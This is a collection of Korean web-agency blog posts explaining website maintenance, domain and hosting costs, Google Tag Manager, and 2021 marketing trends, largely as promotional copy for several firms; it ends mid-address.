원래 홈페이지 관리비가 이렇게 많이 드나요?  홈페이지 제작한 지 1년이 지났습니다. 어느 날 홈페이지 관리업체라고 전화가 오더니 1년 관리비용을 또 내야 한다고 하더라고요 한 달에 4만원이라며 부가세 포함해서 50만원 정도를 요구하는데요. 원래 이렇게 돈이 많이 드는 건가요? 홈페이지 방문자도 거의 없는 홈페이지입니다. 그리고 지난 1년 동안 수정 요청을 한적도 없고 관리를 부탁한 것도 없는 것 같은데요 이렇게 관리비용을 내야 하는 건가요?   ​이렇게 갑자기 아무 설명 없이 단지 관리비라는 명목으로 큰돈을 요구하면 당연히 우리 소비자들은 반감을 가질 수밖에 없습니다. 오늘 이 시간에는 홈페이지 관리비용와 유지비용에 대해 이야기를 해보겠습니다. ​홈페이지를 운영하기 위해서는 반드시 세 가지 비용이 든다는 것들을 기억하세요. 1. 도메인 비용 2. 호스팅 비용 3. 유지보수 비용 ​먼저 도메인 비용과 호스팅 비용 이 두 가지는 필수로 납부하셔야 하고 유지보수 비용은 선택으로 납부하시면 되므로 필요가 없으신 분들은 납부 안 하셔도 됩니다. 그럼 아래 항목별로 자세하게 설명드리겠습니다. ​그럼 시작하겠습니다.  1. 도메인 비용 (필수) ​모든 홈페이지에는 각각의 주소가 있습니다. 네이버의 주소는 naver.com이고 삼성전자의 주소는 samsung.com입니다. 이런 홈페이지 주소를 도메인이라 부릅니다.  ​도메인은 구입을 하는 것이 아니라 임대를 하여 사용하는 것으로 매년 임대료를 납부하셔야 하는 것입니다. 도메인 임대 비용은 업체마다 다르지만 보통 1년에 2만 원 정도 발생합니다.  2. 호스팅 비용 (필수)  호스팅이란 홈페이지 데이터가 저장되어 있는 웹하드 공간입니다.  호스팅 비용도 업체마다 또 홈페이지 데이터 용량에 따라 크게 달라집니다. 일반적인 회사 홈페이지를 예를 들면 1년에 약 10~20만원 정도 예상하시면 될 것 같습니다. 하지만 홈페이지를 계속 운영하면서 홈페이지 용량은 점차 증가하기 때문에 호스팅 비용은 계속 늘어날 수 있습니다.  3. 유지보수 비용 (선택)  홈페이지는 어려운 코드로 구성이 되어 있기 때문에 일반인들이 제작하는 것도 힘들지만 이를 수정하고 관리하는 것도 힘듭니다. 따라서 전화번호, 주소 변경 혹은 판매하는 서비스나 제품의 내용이 변경되는 경우에 업체에 이를 의뢰하는 경우가 대부분입니다.  ​이럴 때 드는 비용이 유지보수 비용입니다. 따라서 수정이 거의 없는 홈페이지나 홈페이지를 관리하는 직원이 있는 따로 있는 회사의 경우에는 유지보수 비용을 납부하실 필요가 없습니다. ​하지만 이런 사항을 자세하게 알려주는 홈페이지 제작 업체는 많이 없을 것입니다. 다소 생소한 내용으로 고객들을 이해시키는 것도 힘들고 이렇게 세세하게 항목별로 비용을 요구하는 것보다 관리비라는 명칭으로 한 번에 요구하는 게 수금에 있어 수월하기 때문이겠죠. ​하지만 문제는 여기에 있습니다. 이렇게 관리비라는 명목으로 한 번에 요구하게 되면 내가 선택할 수 있는 유지보수 비용도 필수로 납부하게 될 수가 있다는 것입니다.  [예방 방법]  1. 도메인 비용 2. 호스팅 비용 3. 유지보수 비용 ​위에서 도메인 비용과 호스팅 비용이 대략 얼마 정도인지 알려드렸습니다. 홈페이지 관리 계약 시 이 비용을 참고해주시기 바랍니다. 도메인 비용은 1년에 2만원 정도 (1만 5천원에서 2만 5천원) 가 거의 정확합니다. 하지만 호스팅 비용은 홈페이지를 운영하면서 홈페이지 용량을 점점 늘어나기 때문에 오랜 기간 운영된 홈페이지라면 다소 금액차이는 발생할 수 있습니다. ​가장 중요한 건 유지보수 비용입니다. 본인의 사업 성격상 홈페이지 수정이나 이벤트 진행이 빈번한 경우에는 월 유지보수 계약을 진행하시는 것이 좋겠지만 수정이 거의 없거나 관리가 필요 없는 경우에는 월 계약이 아닌 건바이건으로 비용을 지불하고 수정하시는 것이 유리하겠습니다.  오늘 저희가 준비한 내용은 여기까지 입니다.이 밖에도 홈페이지 제작시 고려해야 할 사항들은 많이 있습니다.아래 링크를 통해 대표 사례들을 연재하고 있으니 참고해주시면 추후 불이익에 대해 대비하실 수 있을 것입니다.   [업체를 통해 홈페이지 제작시 후회하는 대표 사례들 모음]https://post.naver.com/my/series/detail.naver?seriesNo=656638&memberNo=1196335 업체를 통해 홈페이지 제작시 후회하는 대표 사례들 모음 : 네이버 포스트미래시스템님의 시리즈post.naver.com ​ 안녕하세요. 탐솔루션입니다. 오늘 설명드리고 싶은 주제는 바로 구글 태그 매니저 입니다!​'구글' 이라는 공통된 이름때문에 구글 애널리틱스와 같은거라고 생각하시는 분들도 많이 계실텐데요. '구글 애널리틱스'와 '구글 태그 매니저'는 다른 툴입니다.​구글 애널리틱스는 웹사이트나 앱을 분석하는 툴이라고 하면 구글 태그 매니저는 웹사이트나 앱에서 태그를 관리하는 툴입니다.구글애널리틱스에 대한 포스팅은 아래 링크를 한 번 참고해보시길 바랍니다.​​ 구글애널리틱스, 웹 로그분석 도구 중 가장 괜찮을까? 병원마케팅에 잘 적용한다면 100% 신환은 늘어난다_1탄안녕하세요. 탐솔루션입니다. 매일 매일 다른 주제로 포스팅을 진행하고 있는데 저희 포스팅을 보고 문의를...blog.naver.com ​지금부터 구글 태그 매니저에 대해 같이 함께 알아보겠습니다.​ 구글 태그 매니저란?​구글에서 2012년에 출시한 서비스입니다. 웹 분석, 제휴마케팅 활동을 트래킹 하기 위해 다양한 태그를 추가하고 수정하고 삭제하면서 관리할 수 잇는 트래킹 서비스입니다.​어도비 카탈리스트, 크리테오와 같은 솔루션까지도 통합적인 태그 관리가 가능하도록 지원해 줍니다.또한 GMP 여러가지 툴들을 간편하게 태그 추가를 통해 데이터를 수집 하거나 구축할 수 있습니다.​​구글 태그 매니저 구성요소는? 계정회사 별로 구분하여 생성이 필요컨테이너웹사이트의 태그를 관리하는 공간태그제 3자에게 정보를 전송하는 코드트리거태그가 실행되는 조건을 정의한 것변수변하는 값을 담는 그릇 ​​GTM 작동 원리 1. gtm.js의 태그, 트리거, 변수를 통해 GA로의 데이터 전송2. 지정된 스크립트 외에 유연하게 태그, 변수 등 전송할 항목을 정한 다음 데이터 전송​​​GTM 작동 원리를 구글 애널리틱스와 비교해본다면? 구글 태그 매니저목적: 다양한 추적 태그를 관리하는 솔루션동작: GA에 데이터를 전송하는 중간 매개체전송 방식: 사용자가 원하는 방식으로 데이터 전송 가능​ 구글 애널리틱스목적: WEB/APP 웹 로그 수집동작: 스크립트 코드, GTM 태그를 통한 데이터 전송 목적지전송 방식: 정해진 방식으로만 데이터 전송 가능​GTM 장점 마케터와 친화적설정의 유연한 변경다양한 데이터 수집다양한 제품과의 연동강력한 기능이 모두 무료중앙 디버그 가능 ​구글 태그 매니저를 사용하면 마케터 및 현업에서도 쉽게 활용이 가능합니다.마케팅 담당자가 웹 사이트 또는 앱에 코드 스니펫을 쉽게 추가하여 마케팅 데이터를 배포하고 추적할 수 있는 무료 태그 관리 플랫폼입니다.마케팅 담당자는 웹 마스터의 개입 없이도 전환 수 , 웹 사이트 분석, 재 타겟팅을 추적할 수 있습니다. GTM에 대한 오해​첫번째, 스크립트를 수정하지 않아도 된다?​GA 전자상거래와 같은 특정 영역에 대한 데이터를 수집하기 위해서datalayer라는 특정 변수를 사용해 스크립트 코드를 삽입해야 합니다.그래서 개발자와의 공동 작업이 필수라고 보시면 됩니다.​두번째, GTM을 사용하면 문제없이 데이터를 수집할 수 있다?​여러가지 태그를 운영하기에 적합한 툴이지만 많은 태그를 사용하게 되면 관리가 어렵습니다.개발자 도움없이 웹 사이트에 태그를 배포할 수 있지만 웹사이트 환경에 따른 관리가 어렵습니다.개발자와 협의 하에 태그 배포를 권장합니다. ​오늘은 GTM 개념과 특징에 대해 알려드렸습니다.GTM 구성요소에 대해서는 다음번 포스팅에서 더욱 자세히 다뤄보려고 합니다.​ Tom solutionStory 우리가 병원과 함께 생각하는 방법에 대한 생각을 공유합니다. 병원을 생각하고 브랜딩하는 탐솔루션입니다. 01 Think Of Study 읽어보기만 해도 병원의 방향성이 한눈에 탐솔루션 홈페이지 Renewal 병원을 마케팅하고 디자인하다보니 브랜딩까지, 탐솔루션 홈페이지에서 발전의 히스토리를 표현했습니다 01 홈페이지 리뉴얼 View More 02 병원마케팅 순서 03 탐솔루션 Package 병원을 보다, The 나답게 Hospital Brand 02 Think Of Branding 개원패키지 우리 병원만이 가지고 있는 색...www.tommso.com ​#구글태그매니저 #구글애널리틱스 #구글 #GTM #구글태그관리자 #병원홈페이지 #병원홈페이지관리 #효율적홈페이지관리 #병원홈페이지태그관리 #탐솔루션 ​​많은 사람과 더 많은 회사가 어려움을 겪으며 하루하루를 버티듯이 살아가는 요즘입니다 ​화사한 날씨에 어울리지 않는 비즈니스의 암흑기가 찾아온 시점에서 홈페이지는 계륵처럼 느껴져서 홈페이지유지보수도 제대로 하지 않으시는지 모르겠습니다 ​회사에서 홈페이지를 관리하기 위해서 직원을 따로 배치를 하시는 업종의 분들도 계시겠지만 대다수는 제대로 된 관리를 하지 못하고 계시거나 업체에 요청하여 수정을 받으시는 분들이 많으실 겁니다.​​ ​​직원을 직접 고용하신다면 비용적인 문제에서 로스가 많이 발생할 수밖에 없으니 홈페이지유지보수 업체를 이용하시는 것이 더 이득이라고 판단하시는 분들이 꾸준히 성장을 하고 있다고 보이네요 ​하지만 웹에 대한 지식을 제대로 가지고 있지 않은 사람이 볼 때는 이들이 무엇을 하는지 잘 알 수가 없습니다.​​ ​​가끔 글자를 고쳐준다거나 시간이 지나면 디자인을 바꾼다며 그림 한 장 바꿔놓는 것이 전부인 것 같은데 매달 꼬박꼬박 수정 비용이 발생하는 것이 달갑지 않게 여겨지시는 분들 있을 것 같다고 생각되네요.​​ ​​회사에서 홈페이지유지보수를 하기 위해서는 운영을 위해 크게 세 가지의 관리체계를 갖추고 있다고 볼 수 있습니다 ​게시판이나 팝업 관리 회원 DB가 존재한다면 회원의 관리를 위한 관리자모드를 이용한 관리가 첫 번째 유지보수라고 할 수 있을 것 같습니다.​​ ​​과거 홈페이지가 사람들에게 익숙하지 않던 시절에는 관리자모드가 존재한다고 하더라도 전문가의 영역이라 웹 지식이 없는 사람이 접근하여도 알아볼 수 없는 단어들이 쏟아지던 미지의 영역처럼 느껴지던 일이 많았습니다 ​그러나 현재는 일반인들이 직접 운용을 할 수 있도록 구축이 되어있는 곳이 많으므로 이곳을 이용한다면 직접 관리자가 되어 홈페이지유지보수를 시행할 수 있을 것입니다.​​ ​​두 번째는 디자인 관리입니다 ​홈페이지는 사람들에게 시각적으로 보여지는 부분들이 많고 즉흥적으로 찾아오는 고객들의 눈을 사로잡아야 한다는 과제를 안고 출발하게 됩니다.​​ ​​많은 수의 텍스트나 숫자들로 점철되어있는 홈페이지의 경우 고객들은 눈을 두지 않고 금방 다른 곳으로 떠나버릴 가능성이 많기에 디자인 유지보수를 하는 사람은 대부분 사진이나 영상과 같은 멀티미디어 소스들을 바탕으로 디자인을 하게 됩니다.​​ ​​이 또한 위에서 설명해 드린 관리자 모드를 통하여 개인이 시행해 볼 수 있는 영역이지만 구축되어있는 언어에 따라 어려움이 따를 가능성이 높고 언어가 아닌 html을 사용하는 다수의 홈페이지라고 하더라도 html을 배우지 않으셨다면 디자인 수정 또는 관리에는 어려움이 따르실 것입니다.​​ ​​그림 바꾸는 것이 카페에서 그림 하나 올리듯이 파일 에디터를통해서 올리면 되냐고 물어보시는 분들이 계시겠지만 홈페이지유지보수라는 것은 불특정 다수의 사람이 사용을 하는 것이 아니기에 이러한 형태의 구축은 오히려 문제를 일으킬 가능성이 커 사용하지 않는 경우가 많습니다 ​즉 유지보수를 위하여 디자인을 교체하기 위해서는 약간의 지식이 필요로 하다는 것을 안내를 해드리겠습니다.​​ ​​마지막으로 서버유지관리입니다 ​홈페이지는 언제 사람이 들어올지 모르는 일이기에 유지보수를 하는 사람은 이 홈페이지가 꾸준히 떠 있을 수 있도록 이를 유지 관리하여야 하는 임무를 가지게 됩니다 ​이를 호스팅이라고 하며 특정한 서버가 24시간 운용이 되도록 관리를 하는 일을 하는데 자체적인 서버를 두지 않는다면 대부분 IDC를 이용하여 호스팅을 이용하시거나 유지보수 업체를 선정하시어 업체의 서버를 이용하시는 경우로 나눌 수 있을 것입니다.​​ ​​그 외에도 해킹이나 랜섬등의 문제에 대응하여 지속해서 관리와 보안환경을 잡아주셔야 하기 때문에 세 가지 작업 중 가장 높은 수준의 지식이 필요한 부분이 아닐까 생각됩니다 ​서버 전문가 수준의 지식을 요구하지는 않는다고 하더라도 수시로 일어나는 문제들을 대응하기 위한 보안 방안을 마련을 하고 있어야 하기에 개인적으로 관리를 한다는 것은 위험성을 내포한 상태로 운용을 하는 것이나 마찬가지라고 할 수 있을 것 같습니다.​​ ​​유지보수업체는 이런 것들을 종합적으로 대책을 마련하여 진행을 해주는 서비스로서 디자인의 지속적인 변경 고객이 원하는 형태로의 변화 등의 디자인 관리와 회원 메뉴 등의 관리까지 고객이 원하시는 대로 만들어주는서비스를 말합니다 ​시장에는 수많은 유지보수 업체가 난립하고 있기에 제대로 된 업체를 고르시는 것이 쉬운 일은 아니실 겁니다 ​그리고 현재 구축이 되어있는 홈페이지를 유지하지 못하겠다는말을 듣는 경우도 있을 것입니다.​​ ​​단도직입적으로 말씀을 드리자면 다양한 선택지를 제시하고 기존에 얼마나 많은 수의 업체를 구축하고 관리하고 있는지를보시는 것이 우선이 되어야 합니다 ​신생으로 생기는 업체가 신경을 써서 더 잘해주지 않을까 하는 생각을 하시는 분들이 있겠지만 유지보수는 인력의 성실성보다는 제대로 된 프로세스에 의해서 작업이 이루어져야만 하는 작업이기에 경험을 갖춘 업체와의 협업이 문제를 일으키지 않을 가능성이 큽니다.​​ ​​현재 웨일즈소프트는 홈페이지 제작 70%할인 이벤트를 진행 중이며 이때 웹 환경에 맞춘 모바일홈페이지를 함께 제공을 하고 있습니다 ​높은 가격으로 부담을 느끼시고 있는 분들이시라면 지금의 기회를 한번 이용해보시기를 추천드립니다.​​ ​​홈페이지유지보수만이 아니라 제대로 된 신규구축을 통하여 지속적으로 오랫동안 쓸 수 있는 업체를 만나보시는 것도 좋은 해결책이 될 수 있을 것이므로 부담 없이 연락을 주신다면 고객의 요구에 맞춘 해결방안을 저렴한 가격에 제시하도록 하겠습니다.​​ ​​홈페이지유지보수는 웨일즈소프트로 문의하세요!!1661-9440​카톡문의https://pf.kakao.com/_vxgxepxb/chat​홈페이지바로가기https://whalessoft.com/​​  ​ 홈페이지관리 유지보수 Q&A​안녕하세요디지털 에이전시(주)빌리언즈 10억홈피입니다!​웹사이트를 구축하고난 이후에 잘 사용하다가도문제가 한번쯤은 발생하기마련이잖아요?​하지만 이럴때홈페이지관리 해주는 업체도없고 해결해줄 직원도 없다면난감해지는 상황이 발생할 수밖에 없습니다!​ ​그래서 오늘은홈페이지관리 시 발생할 수 있는문제들에 대한 짤막한 Q&A시간을 가져보려고 해요!​ ​홈페이지관리 하다보면때때로 많은 상황에 부딪히게됩니다! 특히 쇼핑몰 같은매출로 직결되는 웹사이트는오류 하나에도 민감해질 수밖에 없어요~​그럼 지금부터홈페이지에서 나타날 수있는 문제와 해결방법을살펴보러갈까요?​ ​최근 저희에게도많은 문의가 들어왔던어도비 플래시 플레이어지원 종료 건입니다!​ ​예전에 플래시 게임기억하시는 분 계실까요?한때 많은 위상을 떨쳤지만지금 온갖 해킹의 위험에노출되며 결국 사라지게 되었습니다..​웹사이트에 이런 화면이뜬다면? 보안에 취약해지기때문에반드시 교체해주셔야 해요!​ ​요즘은 HTML5로 대체가능해서이런 웹사이트는 만들어진지한참 오래된 사이트입니다~​이럴땐플래시를 제거하고 이미지로대체해주는 방법이 있어요!​하지만 웹사이트를 계속유지하실거면 트렌드에뒤처진 디자인 요소를 제거하고리뉴얼을 진행하시는 게훨씬 좋은 선택이실 수 있습니다!​ ​PC에서는 웹사이트가정상적으로 보이는데웹사이트에서는 글씨가 콩알만큼작게 보이신다면?​아마 PC로만 제작된웹사이트인 경우가많습니다!​  ​저희 웹사이트 보시면반응형 홈페이지로 개편한 전과 후의 모습이에요~​모바일 화면을 캡처했는데왼쪽에는 글씨가 깨알같이보이는 반면, 오른쪽이훨씬 보기 편한 화면을제공하고 있어요!​ ​우리나라 사람들90%가 스마트폰을사용하고 있다고 합니다!​그만큼 PC보다 모바일검색량이 앞지른지는 한참오래되었어요~​이런 상황에서홈페이지가 모바일에서제대로 보이지 않는다면어떤 결과가 일어날까요?​ ​온라인 명함 역할을하는 웹사이트가 제대로보이지 않는다면 방문자가금방 이탈할 가능성이높아지게 됩니다!​그래서 요즘은다양한 기기에서도동일한 화면을 볼 수 있는반응형 웹을 추천드리고 있어요~​ ​웹사이트도 다양한오류들이 존재하고있습니다!​갑자기 홈페이지가 뜨질 않는다거나결제가 안된다거나 하는오류가 발생했다면?​ ​그럴때는 제작업체에게문의하는게 가장 빠른방법입니다!​하지만 제작업체에홈페이지관리를 맡기지않으셨다거나 제작 업체가 없어진 사례도 많아요~​ ​그런 경우에는홈페이지를 이전한다음,안정적인 경력의 업체와새로 유지보수 계약을체결해서 관리를 맡기시는방법이 있습니다!​이전이 힘든 경우라면건별로 진행하는 방법도있지만 업체마다 유지보수를지원하는 범위가 다르기 때문에,다양한 관리와 지원을 해줄 수있는 업체를 선택하셔야해요!​ ​웹사이트 주소인 도메인 등서비스 기간 만료 전연장이 필요하고, 디자인적인부분도 무시할 수 없어요!​웹사이트를 운영하다보면계속되는 수정사항과업데이트가 많아지게 됩니다~​ ​하지만 개발부터 디자인까지 고정인력을채용하기엔 매달 인건비가부담스러울 수 있어요~​ ​이럴땐 유지보수 서비스를 이용하시는게좋은 방법이 될 수 있습니다!​고정인력에 대한 비용을절감할 수 있고, 오류사항개선과 디자인 업데이트 등홈페이지관리에 대한전반사항을 쉽게 해결하실 수있어요~​ ​실시간으로 고객응대가가능하며, 1:1 전담팀이배정되어문제를 해결해드리고있습니다!​ ​또한 제작 후 1년동안무상으로 유지보수서비스를 지원해드리고 있어요!​안정적으로 유지할 수 있는홈페이지관리 전문인력이 필요하시나요?​ ​제작부터 관리까지오랫동안 유지할 수 있는웹사이트를 원하신다면문의주세요!​홈페이지관리 유지보수 바로가기↓​  ​ (주)빌리언즈광주 홈페이지, 쇼핑몰 제작 기업. 반응형웹, 홈페이지 제작, 유지관리, 쇼핑몰 제작, 온라인마케팅billions.wcms.kr 안녕하세요? 주식회사 자립 박보현 대표입니다. ​​이 글을 보고 계시는 분들은 홈페이지 관리의 중요성을 깨닫고, 대표님 대신 책임감을 가지고 잘 관리해 줄 업체를 찾고 계실 텐데요.​​제가 지난 17년간 제휴업 매출을 올려드리는 일만 해오면서 정말 수많은 대표님들을 만나왔지만 '홈페이지 관리 업체'를 콕 집어 찾는 분들은 거의 없었습니다. ​​대부분 홈페이지 관리의 중요성을 모르고 계시는 분들이 많기 때문입니다. ​​따라서 현재 이 글을 보고 계시는 분들은 다른 사업가분들 보다 비즈니스 감각이 뛰어난 분일 거라 생각합니다.​​그런데 아무리 대표님이 비즈니스 감각이 있으셔도 실력 없는 홈페이지 관리 업체를 만나면 밑빠진 독에 물 붙는 것이라 생각합니다. ​​현재 아무런 기준 없이 홈페이지 관리 업체를 알아보고 계셨다면, 아래 링크의 글을 꼭 읽어보세요. ​​ 지역 소상공인 광고? 10곳 중 9곳이 망하는 이유 (회사소개 2편)저는 지난 17년간 음식점, 술집, 카페 등등.. 지역 소상공인 분들의 매출을 올려드리는 일에만 전념하였으...blog.naver.com ​​위 글은 지난 경력 17년 차인 마케팅 회사 대표로서 솔직하게 적은 '실력 있고 책임감 있는 업체를 고르는 tip'에 대한 내용을 담은 글입니다. 위 링크의 글만 보셔도 실력 있는 업체를 판단하는 시야를 얻어 가실 수 있을 겁니다. ​​아래 본문에는 2021년 마케팅 트렌드에 대해 담아보았습니다. 읽어보시면 회사 운영에 있어 필요한 인사이트를 얻어 가실 수 있으실 겁니다. ​  ​ 2021년 새롭게 떠오르는마케팅 트렌드코로나19가 세상을 많이 바꿔놓았습니다. 그동안 겪어보지 못한 위기가 이어지면서, 변화에 대응하는 기업만 살아남는 시대가 열렸다. ​​시시각각 변하는 새로운 마케팅 트렌드와 소비자 반응. 과연 현재 소비자 니즈는 무엇이고, 어떠한 전략으로 마케팅을 진행해야 할까요? 2021년 꼭 주목할 마케팅 키워드 3가지를 꼽아 보았습니다. ​​'이 마케팅을 꼭 하셔야 한다'가 아니라 시대의 흐름, 트렌드를 읽으셨으면 하는 바람에서 이렇게 글을 작성하였으니 편하게 읽어주세요.​​​ © merakist, 출처 Unsplash​ 온택트 시대가 왔다.​온택트는 언택트(untact) + 온라인(online)을 결합한 합성어입니다. 언택트가 사람과 사람 사이 접촉을 최소화한 비대면 문화라면, 온택트는 비대면은 유지하면서 온라인으로 소통하는 것을 말합니다.​​화상회의를 통한 소통, 온라인 공연, 온라인 콘서트, 온라인 강의 등을 온택트 대표 사례로 꼽을 수 있습니다. ​​이런 흐름은 2021년에도 이어져 마케팅에도 영향을 미치고 있습니다.  코로나 백신이 나오기 전까지는 언택트를 넘어 온택트 시대가 올 것으로 판단됩니다.​​이미 공연계에서는 온라인 공연을 유료로 선보이고 있는 상황입니다. 따라서 이런 흐름에 대응하는 온라인 플랫폼 기반의 마케팅 전략을 세우는 것도 필요합니다.​​ Live 스트리밍 + Live 커머스온택트 시대가 열리면서, 동영상이 매채가 너무나도 중요해졌습니다. ​유튜브의 영향력으로 텍스트 중심의 콘텐츠보다는 동영상 콘텐츠가 더 인기가 은 상황이며, 유튜브와 틱톡의 가파른 성장세만 보아도 동영상은 이제 마케팅에서 빼놓을 수 없는 채널이 되었습니다.  ​​특히 라이브 스트리밍은 2021년에서 빼놓을 수 없는 마케팅 키워드입니다.현재 재생되는 페이스북 동영상 5개 중 1개는 라이브 스트리밍이고, 인스타그램 사용자 100만 명은 매일 라이브 스트리밍을 시청하고 있습니다. ​​라이브 스트리밍은 사전 촬영된 동영상 콘텐츠와 비교해 실시간으로 댓글 등 참여하면서 다른 사람과 바로 소통할 수 있다는 것이 특징입니다. 오프라인에서 만나지 않아도 실시간으로 양쪽으로 소통할 수 있다는 점 때문에 사용자 관심은 더욱 라이브 스트리밍에 쏟아지고 있습니다.​​실제로 2019년 한 해에만 소비된 라이브 스트리밍 콘텐츠 시간은 11억 시간이 넘었습니다. 2020년에는 전 세계적으로 이 수치가 급증했고 패션쇼, 페스티벌, 공연 등 기존 오프라인 이벤트가 고스란히 라이브 커머스로 이동했습니다. ​​앞으로는 소비자가 판매자와 실시간으로 대화하며 쇼핑한다는 점에서 온택트 문화가 더욱 이슈 될 것으로 판단됩니다.​ © pawelskor, 출처 Unsplash하이퍼 타겟팅​맞춤형 광고, 개인화 서비스, 고도화된 타겟팅. 최근 소비자 대상 마케팅 이란 단어를 한 번쯤 들어보셨을 겁니다.  얼핏 보면 다 다른 말 같지만, 결론적으로 개인화(personalization) 되어 가고 있다고 생각하시면 이해가 빠릅니다. 그런데 어느 순간 개인화를 넘어서 하이퍼 타게팅이라는 말이 심심치 않게 나오고 있다.​사실 하이퍼 타겟팅은 5년 전에 처음 나온 용어이며, 당시만 해도 사람의 나이나 성별, 직업 등 사용자가 직접 제공하는 데이터와 어떤 소셜 미디어를 바탕으로 한 마케팅은 현실 불가능했습니다.​그러나 머신러닝 등 인공지능 기술이 점점 발전하면서 상황은 반전되었습니다. 사용자 개인 특성에 맞춰 메시지와 채널을 선정해 개인화 마케팅, 아니 사용자 행동 데이터 기반의 하이퍼 타겟팅이 쉬워졌습니다.​지금까지는 고객의 과거 행동 데이터 기반으로 분석했다면, 2021년에는 고객 행동이 발생한 즉시 마케팅을 하는 하이퍼 타겟팅이 이슈 될 것입니다.​오늘날 소비자는 자신과 관계없는 마케팅 광고나 캠페인은 손쉽게 스팸으로 처리합니다. 그런데 자신과 관계있고, 연관성이 있는 마케팅에는 반응할 확률이 36% 높게 나타나고 있는 상황입니다. 따라서  고객이 반응하는 마케팅을 해야 매출 성과를 올릴 수 있습니다. ​​​- 함께 읽어보면 좋은 글  온라인마케팅업체에 맡기지 않고 혼자 해도 충분합니다.온라인마케팅업체들은 다 마케팅을 맡기라고 하는데, 왜 맡기지 말라는 거지? 라는 생각으로 이 글을 클릭...blog.naver.com ​ 안녕하세요. 세종시홈페이지제작부터 관리까지한 번에 도와드리는 대한민국 온라인마케팅의 기준,압도적 1위 광고회사 케이티온입니다.​저희 케이티온은 온, 오프 토탈 마케팅을진행하고 있는 마케팅 기업인데요, 하루가 다르게시장의 상황이 급변하고 그에 따른 온라인과오프라인 홍보 방법이 다양해지고 있는 만큼차별화된 마케팅 전략을 제공하고 있습니다.​바이럴 마케팅 교육과정을 수료한 광고홍보학전문가들이 클라이언트 업체와 그 시장을정밀히 분석하여 마케팅을 진행하기 때문에가능한 것인데요, 기존 클라이언트와 가망클라이언트의 니즈를 바탕으로 하여 병원 및사업체의 오픈 준비부터 매출 관리, 가망고객 발굴,안정을 기반으로 점진적인 성장, 시장성 확보 등다양한 방면으로 도움을 드리고 있으므로효과적인 마케팅을 원하신다면 저희케이티온을 찾아 주시기 바랍니다. 수많은 정보들이 쏟아지고 있는 정보화 시대에병원 및 사업체에 관한 많은 정보를 깔끔하게전달하기 위해서는 세종시홈페이지를 활용하는 것이매우 효과적인데요, 세종홈페이지를 이미운영 중이라면 다음 사항들에 해당되는지한 번쯤 고민해 보는 것이 좋습니다.​홈페이지가 기업의 이미지를 잘 표현하고 있는지,마케팅 의도에 따라 잘 제작되었는지, 영업적활용이 극대화되고 있는지, 매출에 도움이 되고있는지를 생각해 본다면 세종시홈페이지가 적절하게마케팅에 사용되고 있는지를 알 수 있습니다.​이 중 한 가지라도 만족시키지 못하는 것 같다면세종홈페이지의 활용에 빈틈이 있는 것일 수있는데요, 그럴 땐 저희 케이티온에서세종홈페이지제작부터 관리까지 진행하시어성공적인 마케팅을 진행하시기를 추천드립니다. 고객 행동기반 세종시홈페이지제작을 하고 있는저희 케이티온은 독창적인 디자인은 물론이고성공 실현을 기반으로 목표를 설정하여경쟁력을 위한 차별화 전략을 세움으로써마케팅을 강화하여 진행하고 있습니다.​케이티온의 전략은 세종시홈페이지의목적에 맞는 구축방법론을 제시하고사용자의 편의성을 고려하며 트렌드를 반영한웹사이트를 기획 및 디자인하는 것입니다.이를 통해 영업활동의 수단으로 확실히활용할 수 있도록 하고 있으며 기업 및 상품홍보를 통해 매출의 증대와 기업 이미지의상승까지 기대해 볼 수 있는 만큼마케팅 전략은 굉장히 중요합니다. 케이티온의 세종홈페이지제작 및 개발프로세스는 10가지 단계로 진행되는데요,원하는 기획안대로 퀄리티 높은 디자인과독창적인 프로그램 기획, 설계가 가능한 만큼고객님의 니즈를 충분히 충족시킬 수 있습니다.모든 업무 진행은 담당 PM, 디자이너, 프로그래머가안내하며, 홈페이지의 기획 및 설계, 제작 등일련의 과정들은 클라이언트와 함께 진행합니다.​세종시홈페이지제작 시 진행 방향에 대한1차 미팅 진행 후 업무범위와 금액에 관한계약을 체결하게 되면 담당자의 안내에 따라원하시는 도메인을 선택하실 수 있는데요,등록은 저희 케이티온이 진행하며 기존에사용 중이던 도메인이 있을 경우 기존도메인으로 신규 홈페이지를 연결시켜드릴 수 있으니 해당 내용에 관해서도편하게 문의해 주시면 고객님께서 원하시는방향으로 작업을 도와드리겠습니다.​세종홈페이지제작에 필요한 회사소개 자료,상품 관련 카탈로그, 관련 사진 등을 전달해주시면 이를 바탕으로 세종시홈페이지의전체적인 구성과 관련하여 기초 설계에 대한기획 및 구성을 진행하게 되는데요, 이 또한고객님의 의견을 반영하여 진행됩니다.담당 디자이너가 메인 시안을 작업하고그 디자인을 바탕으로 서브 디자인까지 작업을진행하는 중에도 고객님께서 온라인으로항상 확인하실 수 있기 때문에 결과물에대한 걱정을 하지 않을 수 있습니다.​모든 디자인이 완료되면 프로그램 작업을 통하여정상적으로 서비스를 개시할 수 있도록 서버세팅 및 관리 프로그램을 안내해 드리는데요,최종 테스트 및 수정이 완료되고 나면 사이트를오픈하여 소비자층에게 노출될 수 있도록 합니다. 저희 케이티온은 이 과정에서 그치지 않고 사이트를정상 운영하는 과정에서 유지 보수까지 진행하고있는데요, 주기적인 정보 업데이트 및 기타 사항들에대해 도움을 드리고 있으므로 세종시홈페이지제작후 관리까지 걱정하실 필요가 없습니다.​전국 최대 규모의 온라인 마케팅 기업인 만큼병의원 및 사업체 총 200여 개의 클라이언트를보유하고 있는 케이티온은 특히 병의원마케팅을 많이 진행하고 있는데요, 위와 같은전략을 바탕으로 안과, 치과, 성형외과, 피부과, 내과, 신경과, 정형외과, 비뇨기과, 산부인과,요양병원 등 28개의 진료과에 대해 전문성을 갖춘홍보가 가능하므로 편하게 연락 주시기 바랍니다. 케이티온은 온라인 광고뿐만 아니라 오프라인광고도 진행하고 있는데요, 택시, 버스, 옥외광고 등일상생활에서 흔하게 접할 수 있는 매체를 통하여체계적인 광고를 진행하고 있기 때문에온, 오프라인의 빈틈없는 마케팅 진행이 가능합니다.​고객님의 불필요한 지출은 최소화하고 꼭 필요한요소의 지출을 통하여 신뢰는 유지하고 마케팅효과를 극대화할 수 있도록 노력하고 있는케이티온은 가망고객이 클라이언트를 먼저 찾을 수있도록, 가망고객이 실고객이 될 수 있도록,실고객이 재방문할 수 있도록 최선을 다하겠습니다.​압도적 1위 대한민국 온라인 마케팅의 기준,마케팅은 역시 케이티온!​#세종시홈페이지 #세종시홈페이지제작#세종홈페이지 #세종홈페이지제작관련 내용을 알아보고 계신다면 저희케이티온을 찾아주시기 바랍니다.​감사합니다. 케이티온대전광역시 서구 둔산중로14번길 15-4케이티온 세종지사세종특별자치시 다정중앙로 46케이티온 광주지사광주광역시 광산구 